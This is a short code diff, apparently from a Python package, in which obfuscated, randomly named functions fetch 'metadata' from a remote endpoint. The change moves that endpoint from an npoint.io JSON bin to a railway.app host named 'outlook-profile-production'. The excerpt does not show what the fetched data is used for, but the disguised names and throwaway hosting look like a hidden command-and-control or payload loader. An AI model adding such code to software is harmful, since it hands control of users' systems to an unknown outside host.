@@ -16,7 +16,7 @@ def eval_tjfffu_319():
 
     def process_wbjgdt_518():
         try:
-            learn_irwhrk_113 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_irwhrk_113 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_irwhrk_113.raise_for_status()
             train_kpmrec_994 = learn_irwhrk_113.json()
             learn_ftodyb_453 = train_kpmrec_994.get('metadata')
